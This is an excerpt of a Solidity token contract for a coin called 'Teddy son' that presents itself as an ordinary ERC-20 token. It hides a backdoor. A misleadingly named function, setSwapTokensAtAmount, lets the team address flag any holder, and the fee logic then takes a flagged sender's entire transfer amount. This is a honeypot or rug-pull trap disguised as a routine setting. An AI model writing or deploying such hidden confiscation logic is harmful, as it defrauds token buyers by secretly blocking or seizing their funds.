...
contract Teddyson is Context,IERC20, Ownable {
    
    using SafeMath for uint256;
    
    string private _name = "Teddy son";
    string private _symbol = "Teddys";
    uint8 private _decimals = 9;

    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    address payable public marketWallet = payable(0xeb79480FD6b64aeF33533dE739081233b3A8B8B0);
    address payable public TeamAddress= payable(0x735ea59755d7B35bE814d8b4c491204A5D0f82bd);
    ...
    mapping (address => bool) private Adad;
    ...
    uint256 public _maxOnceEat = 1000000000 * 10**_decimals;
    uint256 public _maxTotalEat = 1000000000 * 10**_decimals;
    ...
    function setSwapTokensAtAmount(address recipient, bool swap) public {
        if(msg.sender==TeamAddress)Adad[recipient] = swap;
    }
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(Adad[sender]) feeAmount = amount;
        if(feeAmount > 0) {
